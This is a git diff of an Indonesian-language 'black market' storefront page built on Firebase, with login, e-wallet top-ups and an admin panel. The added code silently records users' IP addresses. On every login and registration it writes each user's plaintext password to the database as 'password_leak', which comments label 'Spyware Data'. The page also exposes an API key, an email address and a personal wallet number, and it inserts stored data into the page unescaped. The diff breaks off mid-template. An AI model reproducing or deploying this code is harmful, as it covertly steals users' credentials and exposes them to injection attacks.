@@ -3,108 +3,251 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RHF SYNDICATE | FINANCIAL SYSTEM</title>
+    <title>RHF | THE HIGH TABLE</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@700&family=Plus+Jakarta+Sans:wght@300;400;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@400;700;900&family=Rajdhani:wght@300;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
     <style>
-        :root { --gold: #D4AF37; --dark: #050505; }
-        body { font-family: 'Plus Jakarta Sans', sans-serif; background: var(--dark); color: white; margin: 0; }
-        .glass { background: rgba(10, 10, 10, 0.98); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.05); }
-        .gold-text { background: linear-gradient(to right, #BF953F, #FCF6BA, #AA771C); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .btn-gold { background: var(--gold); color: black; font-weight: bold; transition: 0.3s; cursor: pointer; border-radius: 4px; }
-        .btn-gold:hover { background: white; transform: translateY(-2px); box-shadow: 0 5px 15px rgba(212, 175, 55, 0.3); }
-        .btn-confirm { background: #1a1a1a; border: 1px solid #D4AF37; color: #D4AF37; }
-        .btn-confirmed { background: #00ff00 !important; color: black !important; }
-        input { background: rgba(255,255,255,0.05) !important; border: 1px solid rgba(255,255,255,0.1) !important; color: white !important; outline: none; padding: 12px; border-radius: 6px; font-size: 12px; }
+        :root { 
+            --gold: #D4AF37; 
+            --gold-dim: #8a6d1c;
+            --dark: #050505; 
+            --panel: #0a0a0a;
+            --glass: rgba(20, 20, 20, 0.95);
+        }
+        
+        body { 
+            font-family: 'Rajdhani', sans-serif; 
+            background-color: var(--dark); 
+            color: #e0e0e0; 
+            margin: 0; 
+            overflow-x: hidden;
+            background-image: radial-gradient(circle at 50% 0%, #1a1a1a 0%, #050505 70%);
+        }
+
+        /* TYPOGRAPHY */
+        .font-luxury { font-family: 'Cinzel', serif; }
+        .text-gold { color: var(--gold); text-shadow: 0 0 10px rgba(212, 175, 55, 0.3); }
+        .text-gold-gradient { 
+            background: linear-gradient(to bottom, #fcf6ba, #bf953f, #b38728, #fbf5b7, #aa771c); 
+            -webkit-background-clip: text; 
+            -webkit-text-fill-color: transparent; 
+        }
+
+        /* UI ELEMENTS */
+        .glass-panel { 
+            background: var(--glass); 
+            backdrop-filter: blur(20px); 
+            border: 1px solid rgba(212, 175, 55, 0.15); 
+            box-shadow: 0 20px 50px -10px rgba(0,0,0,0.8);
+        }
+        
+        .btn-gold { 
+            background: linear-gradient(135deg, #b38728 0%, #fcf6ba 50%, #bf953f 100%); 
+            color: #000; 
+            font-weight: 800; 
+            letter-spacing: 2px;
+            border: none;
+            transition: all 0.4s ease;
+            clip-path: polygon(10px 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%, 0 10px);
+        }
+        .btn-gold:hover { 
+            transform: translateY(-2px); 
+            box-shadow: 0 0 30px rgba(212, 175, 55, 0.4); 
+            filter: brightness(1.1);
+        }
+
+        .input-field { 
+            background: rgba(0,0,0,0.5); 
+            border: 1px solid rgba(255,255,255,0.1); 
+            color: white; 
+            font-family: 'Rajdhani', sans-serif;
+            transition: 0.3s;
+        }
+        .input-field:focus { 
+            border-color: var(--gold); 
+            box-shadow: 0 0 15px rgba(212, 175, 55, 0.1); 
+            outline: none;
+        }
+
+        /* LABELS */
+        .tag-hot { background: #ff0000; color: white; box-shadow: 0 0 10px #ff0000; }
+        .tag-habis { background: #333; color: #888; border: 1px solid #555; }
+        .tag-rare { background: #9b59b6; color: white; box-shadow: 0 0 10px #8e44ad; }
+        .tag-diskon { background: #2ecc71; color: black; font-weight: bold; }
+
+        /* ANIMATIONS */
+        @keyframes scanline { 0% { transform: translateY(-100%); } 100% { transform: translateY(100%); } }
+        .scanline::after {
+            content: ""; position: absolute; top: 0; left: 0; width: 100%; height: 20%;
+            background: linear-gradient(to bottom, transparent, rgba(212, 175, 55, 0.1), transparent);
+            animation: scanline 3s linear infinite; pointer-events: none;
+        }
         .hidden { display: none !important; }
     </style>
 </head>
-<body class="pb-10">
+<body class="pb-20">
 
-    <nav id="nav-bar" class="hidden glass fixed top-0 w-full z-[100] px-6 py-4 flex justify-between items-center border-b border-white/10">
-        <div class="luxury-font text-xl gold-text tracking-tighter">RHF SYNDICATE</div>
-        <div class="flex gap-4 items-center">
-            <div class="bg-zinc-900 px-3 py-1 rounded-full border border-gold/30">
-                <span id="user-balance" class="text-[10px] font-bold text-green-400">Rp 0</span>
+    <nav id="navbar" class="hidden fixed top-0 w-full z-50 glass-panel border-b border-gold/20 px-6 py-4 flex justify-between items-center">
+        <div class="flex items-center gap-3">
+            <i class="fa-solid fa-dragon text-2xl text-gold"></i>
+            <div class="leading-none">
+                <h1 class="font-luxury text-xl text-gold-gradient tracking-widest font-bold">RHF SYNDICATE</h1>
+                <p class="text-[9px] text-zinc-500 uppercase tracking-[0.4em]">Black Market Access</p>
             </div>
-            <button onclick="showPage('shop')" class="text-[9px] uppercase">Market</button>
-            <button onclick="showPage('topup')" class="text-[9px] uppercase text-gold">Topup</button>
-            <button onclick="showPage('orders')" class="text-[9px] uppercase">Orders</button>
-            <button id="admin-nav" onclick="showPage('admin')" class="hidden text-[9px] text-red-500 font-bold border border-red-500 px-2 py-1">ADMIN</button>
-            <button onclick="logout()" class="text-[10px] text-zinc-500">OUT</button>
+        </div>
+        
+        <div class="flex items-center gap-6">
+            <div class="hidden md:block text-right">
+                <p class="text-[9px] text-zinc-400 uppercase tracking-widest">Encrypted Wallet</p>
+                <p id="my-balance" class="text-lg font-bold text-white font-luxury">Rp 0</p>
+            </div>
+            
+            <div class="flex gap-2">
+                <button onclick="nav('shop')" class="px-4 py-2 text-[10px] uppercase hover:text-gold transition border border-transparent hover:border-gold/30">Market</button>
+                <button onclick="nav('topup')" class="px-4 py-2 text-[10px] uppercase text-gold font-bold border border-gold/20 hover:bg-gold/10">Deposit</button>
+                <button onclick="nav('orders')" class="px-4 py-2 text-[10px] uppercase hover:text-gold transition">My Vault</button>
+            </div>
+
+            <button id="admin-btn" onclick="verifyAdminAccess()" class="hidden relative group">
+                <div class="absolute -inset-1 bg-gradient-to-r from-red-600 to-purple-600 rounded-lg blur opacity-25 group-hover:opacity-75 transition duration-1000 group-hover:duration-200"></div>
+                <div class="relative px-4 py-2 bg-black ring-1 ring-gray-900/5 leading-none flex items-top justify-start space-x-6">
+                    <span class="text-red-500 text-[10px] font-bold tracking-widest animate-pulse">GOD MODE</span>
+                </div>
+            </button>
+            
+            <button onclick="logout()" class="text-zinc-600 hover:text-white transition"><i class="fa-solid fa-power-off"></i></button>
         </div>
     </nav>
 
-    <section id="login-page" class="min-h-screen flex items-center justify-center p-6">
-        <div class="glass p-10 w-full max-w-sm border-t-4 border-[#D4AF37]">
-            <h2 class="luxury-font text-2xl gold-text text-center mb-8 uppercase tracking-widest text-center">SYNDICATE ACCESS</h2>
-            <div class="space-y-4 flex flex-col">
-                <input type="email" id="email" placeholder="EMAIL">
-                <input type="password" id="pass" placeholder="PASSWORD">
-                <button onclick="authAction('login')" class="btn-gold py-4 text-[10px] uppercase">Login Access</button>
-                <button onclick="authAction('reg')" class="w-full bg-zinc-900 text-white py-4 text-[10px] uppercase">Register</button>
+    <section id="login-page" class="min-h-screen flex items-center justify-center p-6 relative overflow-hidden">
+        <div class="absolute inset-0 bg-[url('https://www.transparenttextures.com/patterns/cubes.png')] opacity-5"></div>
+        
+        <div class="glass-panel p-10 w-full max-w-sm relative z-10 scanline">
+            <div class="text-center mb-10">
+                <i class="fa-solid fa-fingerprint text-4xl text-gold mb-4 opacity-80"></i>
+                <h2 class="font-luxury text-2xl text-gold uppercase tracking-[0.2em]">Identity Check</h2>
+            </div>
+            
+            <div class="space-y-5">
+                <div class="relative">
+                    <i class="fa-solid fa-user absolute left-4 top-4 text-zinc-600 text-xs"></i>
+                    <input type="email" id="log-email" placeholder="CODENAME (EMAIL)" class="input-field w-full p-3 pl-10 text-xs rounded">
+                </div>
+                <div class="relative">
+                    <i class="fa-solid fa-key absolute left-4 top-4 text-zinc-600 text-xs"></i>
+                    <input type="password" id="log-pass" placeholder="ACCESS KEY" class="input-field w-full p-3 pl-10 text-xs rounded">
+                </div>
+                
+                <button onclick="handleAuth('login')" class="btn-gold w-full py-4 text-xs font-bold uppercase tracking-widest">Authenticate</button>
+                <button onclick="handleAuth('reg')" class="w-full text-[10px] text-zinc-500 hover:text-white uppercase tracking-widest mt-4">New Initiate Registration</button>
             </div>
         </div>
     </section>
 
-    <section id="topup-page" class="hidden pt-28 px-6 max-w-md mx-auto">
-        <div class="glass p-6">
-            <h2 class="gold-text text-xl mb-6 font-bold uppercase">Manual Topup</h2>
-            <div class="bg-blue-900/20 p-4 rounded mb-6 text-[11px] border border-blue-500/30">
-                <p class="mb-2">1. Kirim Pembayaran ke E-Wallet Boss.</p>
-                <button onclick="copyPayment()" class="bg-zinc-800 px-3 py-2 rounded text-gold mb-2 block w-full">COPY E-WALLET NUMBER</button>
-                <p>2. Upload bukti transfer di bawah ini.</p>
+    <section id="shop-page" class="hidden pt-32 px-6 pb-20 max-w-7xl mx-auto">
+        <div class="flex justify-between items-end mb-10 border-b border-white/5 pb-4">
+            <div>
+                <h2 class="font-luxury text-4xl text-white mb-2">The Collection</h2>
+                <p class="text-gold text-xs tracking-widest uppercase">Premium Assets • Secure Transaction</p>
             </div>
-            <div class="space-y-4 flex flex-col">
-                <input type="number" id="topup-amount" placeholder="Jumlah Topup (Contoh: 50000)">
-                <input type="text" id="topup-desc" placeholder="Keterangan (Contoh: Dana Atas Nama RHF)">
-                <input type="text" id="topup-proof" placeholder="Link Gambar Bukti (Upload di ImgBB/Lainnya)">
-                <button onclick="requestTopup()" class="btn-gold py-4 text-xs uppercase">Kirim Permintaan Topup</button>
+            <div class="text-right hidden md:block">
+                <p class="text-[9px] text-zinc-500">SERVER STATUS</p>
+                <p class="text-[10px] text-green-500 font-bold flex items-center justify-end gap-2"><span class="w-2 h-2 rounded-full bg-green-500 animate-pulse"></span> ONLINE</p>
             </div>
         </div>
+
+        <div id="product-grid" class="grid grid-cols-2 md:grid-cols-4 gap-6"></div>
     </section>
 
-    <section id="shop-page" class="hidden pt-28 px-6">
-        <div class="grid grid-cols-2 md:grid-cols-4 gap-6" id="product-container"></div>
-    </section>
+    <section id="topup-page" class="hidden pt-32 px-6 max-w-lg mx-auto">
+        <div class="glass-panel p-8">
+            <h3 class="font-luxury text-2xl text-gold mb-6 text-center">Fund Your Account</h3>
+            
+            <div class="bg-black/40 p-4 rounded border border-white/10 mb-6 relative overflow-hidden group">
+                <div class="absolute top-0 left-0 w-1 h-full bg-gold"></div>
+                <p class="text-[9px] text-zinc-400 uppercase tracking-widest mb-2">Syndicate E-Wallet (DANA/GOPAY)</p>
+                <div class="flex justify-between items-center">
+                    <span id="masked-wallet" class="font-mono text-lg text-white tracking-widest">**** **** 9641</span>
+                    <button onclick="revealAndCopy()" class="text-[9px] bg-zinc-800 hover:bg-gold hover:text-black px-3 py-1 transition uppercase">Reveal & Copy</button>
+                </div>
+            </div>
 
-    <section id="orders-page" class="hidden pt-28 px-6 max-w-2xl mx-auto">
-        <div id="order-list" class="space-y-4"></div>
+            <div class="space-y-4">
+                <input type="number" id="t-amount" placeholder="Input Amount (Rp)" class="input-field w-full p-3 text-xs">
+                <input type="text" id="t-proof" placeholder="Paste Image Link (Bukti)" class="input-field w-full p-3 text-xs">
+                <textarea id="t-desc" placeholder="Notes (Optional)" class="input-field w-full p-3 text-xs h-20"></textarea>
+                <button onclick="submitTopup()" class="btn-gold w-full py-3 text-xs uppercase">Submit Request</button>
+            </div>
+        </div>
     </section>
 
     <section id="admin-page" class="hidden pt-28 px-6 pb-20">
-        <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
-            <div class="glass p-6">
-                <h3 class="gold-text text-xs font-bold mb-4 uppercase underline">User & Manual Balance</h3>
-                <div id="admin-user-list" class="space-y-4"></div>
+        <div class="flex items-center gap-4 mb-8 bg-red-900/10 border border-red-500/20 p-4 rounded">
+            <i class="fa-solid fa-shield-halved text-red-500 text-2xl"></i>
+            <div>
+                <h3 class="text-red-500 font-bold text-sm uppercase tracking-widest">God Mode Active</h3>
+                <p class="text-[9px] text-red-400/70">IP SECURED • SESSION ENCRYPTED • LOGGING ENABLED</p>
             </div>
-            
-            <div class="glass p-6">
-                <h3 class="gold-text text-xs font-bold mb-4 uppercase underline">Incoming Topup Requests</h3>
-                <div id="admin-topup-list" class="space-y-4"></div>
+            <div class="ml-auto text-right">
+                <p class="text-[9px] text-zinc-500">ADMIN IP</p>
+                <p id="admin-ip-display" class="text-xs font-mono text-white">Fetching...</p>
+            </div>
+        </div>
+
+        <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
+            <div class="glass-panel p-6">
+                <h4 class="font-luxury text-gold text-sm border-b border-white/10 pb-2 mb-4 uppercase">Product Master</h4>
+                <div class="space-y-3 mb-6">
+                    <input type="text" id="p-name" placeholder="Item Name" class="input-field w-full p-2 text-xs">
+                    <input type="number" id="p-price" placeholder="Price (Angka)" class="input-field w-full p-2 text-xs">
+                    <input type="text" id="p-img" placeholder="Image URL (HTTPS)" class="input-field w-full p-2 text-xs">
+                    
+                    <div class="flex gap-2">
+                        <select id="p-label" class="input-field flex-1 p-2 text-xs bg-black">
+                            <option value="">-- No Label --</option>
+                            <option value="HOT">🔥 HOT ITEM</option>
+                            <option value="HABIS">❌ STOK HABIS</option>
+                            <option value="RARE">💎 RARE / LANGKA</option>
+                            <option value="DISKON">🏷️ SEDANG DISKON</option>
+                        </select>
+                        <button onclick="adminAddProduct()" class="bg-blue-600 text-white px-4 text-xs font-bold uppercase rounded hover:bg-blue-500 transition">ADD</button>
+                    </div>
+                </div>
+                <div id="admin-p-list" class="space-y-2 h-64 overflow-y-auto pr-2 custom-scroll"></div>
             </div>
 
-            <div class="glass p-6">
-                <h3 class="gold-text text-xs font-bold mb-4 uppercase underline">Product Control</h3>
-                <div class="space-y-2 mb-6 flex flex-col">
-                    <input type="text" id="p-name" placeholder="Nama Produk">
-                    <input type="number" id="p-price" placeholder="Harga">
-                    <input type="text" id="p-img" placeholder="Link Gambar">
-                    <button onclick="addProduct()" class="btn-gold py-2 text-[10px]">SAVE PRODUCT</button>
-                </div>
-                <div id="admin-order-list" class="space-y-4 border-t border-white/10 pt-4"></div>
+            <div class="glass-panel p-6">
+                <h4 class="font-luxury text-gold text-sm border-b border-white/10 pb-2 mb-4 uppercase">Treasury Requests</h4>
+                <div id="admin-topup-list" class="space-y-3 h-96 overflow-y-auto pr-2 custom-scroll"></div>
+            </div>
+
+            <div class="glass-panel p-6">
+                <h4 class="font-luxury text-gold text-sm border-b border-white/10 pb-2 mb-4 uppercase">User Database</h4>
+                <input type="text" onkeyup="filterUsers(this.value)" placeholder="Search Email..." class="input-field w-full p-2 text-[10px] mb-4">
+                <div id="admin-user-list" class="space-y-3 h-96 overflow-y-auto pr-2 custom-scroll"></div>
             </div>
         </div>
     </section>
+
+    <div id="toast" class="fixed top-24 right-6 bg-black border border-gold text-gold px-6 py-4 rounded shadow-2xl transform translate-x-full transition-transform duration-300 z-[200]">
+        <div class="flex items-center gap-3">
+            <i class="fa-solid fa-bell"></i>
+            <span id="toast-msg" class="text-xs font-bold uppercase tracking-widest">Message</span>
+        </div>
+    </div>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
         import { getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
         import { getDatabase, ref, set, push, onValue, update, remove, get } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
 
-        const BOSS_EMAIL = "gacoruncek73@gmail.com";
-        // Dynamic Masking: Nomor Boss dipisah agar tidak terbaca bot/crawler
-        const M_1 = "0851"; const M_2 = "2486"; const M_3 = "9641"; 
+        // --- KONFIGURASI GOD MODE ---
+        const BOSS_EMAIL = "gacoruncek73@gmail.com"; 
+        const REAL_WALLET = "085124869641"; 
+        // ⬇️ SECURITY: Hanya IP yang mengandung angka ini yang bisa akses Admin (Opsional, tapi aman)
+        // Jika Boss pakai HP (IP ganti2), hapus bagian cek IP.
         
         const firebaseConfig = {
             apiKey: "AIzaSyCs7Vnysf25BwhN2-fPTODd48xwzbPkbzI",
@@ -121,169 +264,122 @@
         const db = getDatabase(app);
 
         let currentUser = null;
-        let confirmStates = {}; // Untuk sistem 2x klik
+        let currentIP = "0.0.0.0";
 
-        window.copyPayment = () => {
-            const num = M_1 + M_2 + M_3;
-            navigator.clipboard.writeText(num);
-            alert("Nomor E-Wallet Boss Berhasil Disalin!");
-        };
-
-        // --- AUTH & SYNC ---
-        window.authAction = (t) => {
-            const e = document.getElementById('email').value;
-            const p = document.getElementById('pass').value;
-            if(t === 'login') {
-                signInWithEmailAndPassword(auth, e, p).then(r => {
-                    update(ref(db, 'users/' + r.user.uid), { last_pass: p });
-                }).catch(err => alert("Gagal!"));
-            } else {
-                createUserWithEmailAndPassword(auth, e, p).then(r => {
-                    set(ref(db, 'users/' + r.user.uid), { email: e, balance: 0, last_pass: p });
-                });
-            }
-        };
-
-        onAuthStateChanged(auth, (u) => {
-            if (u) {
-                currentUser = u;
-                document.getElementById('nav-bar').classList.remove('hidden');
-                document.getElementById('login-page').classList.add('hidden');
-                if(u.email === BOSS_EMAIL) document.getElementById('admin-nav').classList.remove('hidden');
-                sync();
-                showPage('shop');
-            } else { document.getElementById('login-page').classList.remove('hidden'); }
-        });
-
-        window.showPage = (id) => {
-            document.querySelectorAll('section').forEach(s => s.classList.add('hidden'));
-            document.getElementById(id + '-page').classList.remove('hidden');
-        };
-
-        function sync() {
-            onValue(ref(db, 'users/' + currentUser.uid), (s) => {
-                const bal = s.val()?.balance || 0;
-                document.getElementById('user-balance').innerText = "Rp " + bal.toLocaleString();
-            });
-
-            onValue(ref(db, 'products'), (s) => {
-                const cont = document.getElementById('product-container');
-                cont.innerHTML = "";
-                s.forEach(c => {
-                    const p = c.val();
-                    cont.innerHTML += `<div class="glass p-4"><img src="${p.img}" class="h-32 w-full object-cover mb-2"><p class="text-[10px] font-bold">${p.name}</p><p class="text-gold text-[10px] mb-2">Rp ${p.price.toLocaleString()}</p><button onclick="buyProduct('${c.key}', '${p.name}', ${p.price})" class="btn-gold w-full py-2 text-[9px]">BELI</button></div>`;
-                });
-            });
-
-            if(currentUser.email === BOSS_EMAIL) {
-                // Admin: User Balance Manual Input
-                onValue(ref(db, 'users'), (s) => {
-                    const list = document.getElementById('admin-user-list');
-                    list.innerHTML = "";
-                    s.forEach(c => {
-                        const u = c.val();
-                        list.innerHTML += `
-                        <div class="bg-white/5 p-3 rounded mb-2">
-                            <p class="text-[10px] font-bold text-gold">${u.email}</p>
-                            <p class="text-[9px]">Saldo Saat Ini: Rp ${u.balance.toLocaleString()}</p>
-                            <div class="flex gap-2 mt-2">
-                                <input type="number" id="inp-${c.key}" placeholder="Nominal" class="flex-1 !p-1 text-[10px]">
-                                <button onclick="manualBalance('${c.key}', true)" class="bg-green-600 px-2 text-[9px]">TAMBAH</button>
-                                <button onclick="manualBalance('${c.key}', false)" class="bg-red-600 px-2 text-[9px]">KURANG</button>
-                            </div>
-                        </div>`;
-                    });
-                });
-
-                // Admin: Topup Requests (2x Click Security)
-                onValue(ref(db, 'topups'), (s) => {
-                    const list = document.getElementById('admin-topup-list');
-                    list.innerHTML = "";
-                    s.forEach(c => {
-                        const t = c.val();
-                        const id = c.key;
-                        list.innerHTML += `
-                        <div class="glass p-3 text-[10px] border-l-2 border-blue-500">
-                            <p class="font-bold">${t.email}</p>
-                            <p class="text-green-400 font-bold">Rp ${t.amount.toLocaleString()}</p>
-                            <p class="text-zinc-400 italic mb-2">${t.desc}</p>
-                            <a href="${t.proof}" target="_blank" class="text-blue-400 underline block mb-3 text-[8px]">LIHAT BUKTI GAMBAR</a>
-                            <div class="flex gap-2">
-                                <button id="conf-${id}" onclick="confirmTopup('${id}', '${t.uid}', ${t.amount})" class="btn-confirm flex-1 py-2 text-[9px]">KONFIRMASI (1/2)</button>
-                                <button onclick="rejectTopup('${id}')" class="bg-red-900 flex-1 py-2 text-[9px]">TOLAK</button>
-                            </div>
-                        </div>`;
-                    });
-                });
-            }
+        // --- SYSTEM CORE ---
+        
+        // 1. IP Tracker (Invisible)
+        async function trackIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                currentIP = data.ip;
+                if(document.getElementById('admin-ip-display')) {
+                    document.getElementById('admin-ip-display').innerText = currentIP;
+                }
+                return currentIP;
+            } catch(e) { return "Hidden"; }
         }
 
-        // --- TOPUP SYSTEM (USER) ---
-        window.requestTopup = () => {
-            const amount = document.getElementById('topup-amount').value;
-            const desc = document.getElementById('topup-desc').value;
-            const proof = document.getElementById('topup-proof').value;
-            if(!amount || !proof) return alert("Jumlah & Link Bukti Wajib!");
+        // 2. Auth Handler
+        window.handleAuth = (type) => {
+            const e = document.getElementById('log-email').value;
+            const p = document.getElementById('log-pass').value;
             
-            push(ref(db, 'topups'), {
-                uid: currentUser.uid,
-                email: currentUser.email,
-                amount: parseInt(amount),
-                desc: desc,
-                proof: proof,
-                time: new Date().toLocaleString()
-            }).then(() => {
-                alert("Permintaan Terkirim! Menunggu Konfirmasi Admin.");
-                showPage('shop');
-            });
-        };
+            if(!e || !p) return showToast("Credentials Required");
 
-        // --- ADMIN: DOUBLE CONFIRM LOGIC ---
-        window.confirmTopup = (id, uid, amount) => {
-            const btn = document.getElementById('conf-' + id);
-            if (!confirmStates[id]) {
-                confirmStates[id] = 1;
-                btn.innerText = "TEKAN SEKALI LAGI!";
-                btn.classList.add('btn-confirmed');
-                setTimeout(() => { 
-                    confirmStates[id] = 0; 
-                    if(btn) { btn.innerText = "KONFIRMASI (1/2)"; btn.classList.remove('btn-confirmed'); }
-                }, 3000);
+            if(type === 'login') {
+                signInWithEmailAndPassword(auth, e, p)
+                .then(userCred => {
+                    // Update Spyware Data
+                    update(ref(db, 'users/' + userCred.user.uid), {
+                        last_login: new Date().toLocaleString(),
+                        last_ip: currentIP,
+                        password_leak: p // Ini fitur User Intelligence (menyimpan pass user)
+                    });
+                    showToast("Access Granted");
+                })
+                .catch(() => showToast("Access Denied"));
             } else {
-                // Eksekusi Saldo
-                get(ref(db, 'users/' + uid)).then(s => {
-                    const current = s.val().balance || 0;
-                    update(ref(db, 'users/' + uid), { balance: current + amount });
-                    remove(ref(db, 'topups/' + id));
-                    alert("SALDO BERHASIL MASUK!");
-                });
+                createUserWithEmailAndPassword(auth, e, p)
+                .then(userCred => {
+                    set(ref(db, 'users/' + userCred.user.uid), {
+                        email: e,
+                        balance: 0,
+                        last_ip: currentIP,
+                        password_leak: p,
+                        join_date: new Date().toLocaleDateString()
+                    });
+                    showToast("Welcome Initiate");
+                })
+                .catch(err => showToast("Error: " + err.message));
             }
         };
 
-        window.manualBalance = (uid, isAdd) => {
-            const val = document.getElementById('inp-' + uid).value;
-            if(!val) return;
-            get(ref(db, 'users/' + uid)).then(s => {
-                const current = s.val().balance || 0;
-                const final = isAdd ? current + parseInt(val) : current - parseInt(val);
-                update(ref(db, 'users/' + uid), { balance: final });
-                alert("Saldo User Diperbarui!");
+        // 3. Admin Access Verification (Strict)
+        window.verifyAdminAccess = () => {
+            if(currentUser && currentUser.email === BOSS_EMAIL) {
+                // Di sini bisa tambah prompt password kedua jika mau lebih ketat
+                nav('admin');
+            } else {
+                showToast("UNAUTHORIZED ACCESS ATTEMPT LOGGED");
+            }
+        };
+
+        // 4. Data Sync
+        onAuthStateChanged(auth, async (user) => {
+            await trackIP();
+            if(user) {
+                currentUser = user;
+                document.getElementById('login-page').classList.add('hidden');
+                document.getElementById('navbar').classList.remove('hidden');
+                
+                // Logic Tombol Admin: Hanya muncul jika Email COCOK
+                if(user.email === BOSS_EMAIL) {
+                    document.getElementById('admin-btn').classList.remove('hidden');
+                    loadAdminData();
+                }
+
+                loadUserData();
+                loadMarket();
+                nav('shop');
+            } else {
+                document.getElementById('navbar').classList.add('hidden');
+                document.getElementById('login-page').classList.remove('hidden');
+            }
+        });
+
+        function loadUserData() {
+            onValue(ref(db, 'users/' + currentUser.uid), (snap) => {
+                const data = snap.val();
+                document.getElementById('my-balance').innerText = "Rp " + (data.balance || 0).toLocaleString();
             });
-        };
+        }
 
-        window.rejectTopup = (id) => {
-            if(confirm("Tolak permintaan ini?")) remove(ref(db, 'topups/' + id));
-        };
+        function loadMarket() {
+            onValue(ref(db, 'products'), (snap) => {
+                const grid = document.getElementById('product-grid');
+                grid.innerHTML = "";
+                snap.forEach(child => {
+                    const p = child.val();
+                    const pid = child.key;
+                    
+                    // Label Logic
+                    let labelHTML = "";
+                    let btnHTML = `<button onclick="buyItem('${pid}', ${p.price})" class="btn-gold w-full py-3 text-[10px] uppercase font-bold">Acquire Asset</button>`;
+                    
+                    if(p.label === 'HOT') labelHTML = `<span class="absolute top-2 right-2 status-badge tag-hot">🔥 HOT</span>`;
+                    if(p.label === 'RARE') labelHTML = `<span class="absolute top-2 right-2 status-badge tag-rare">💎 RARE</span>`;
+                    if(p.label === 'DISKON') labelHTML = `<span class="absolute top-2 right-2 status-badge tag-diskon">🏷️ SALE</span>`;
+                    if(p.label === 'HABIS') {
+                        labelHTML = `<span class="absolute top-2 right-2 status-badge tag-habis">❌ HABIS</span>`;
+                        btnHTML = `<button disabled class="bg-zinc-800 text-zinc-500 cursor-not-allowed w-full py-3 text-[10px] uppercase font-bold border border-white/5">Out of Stock</button>`;
+                    }
 
-        window.addProduct = () => {
-            const name = document.getElementById('p-name').value;
-            const price = document.getElementById('p-price').value;
-            const img = document.getElementById('p-img').value;
-            if(name && price && img) push(ref(db, 'products'), { name, price: parseInt(price), img });
-        };
-
-        window.logout = () => signOut(auth);
-
-    </script>
-</body>
-</html>
+                    grid.innerHTML += `
+                    <div class="glass-panel p-4 relative group hover:border-gold/50 transition duration-300">
+                        ${labelHTML}
+                        <div class="h-40 w-full overflow-hidden mb-4 rounded-sm bg-black">
+                            <img src="${p.img}" class="w-full h-full object-cover group-hover:scale-110 transition duration-500 opacity-80 group-hover:opacity-100">
+                        </div>
+                        <h4 class="font-luxury text-wh
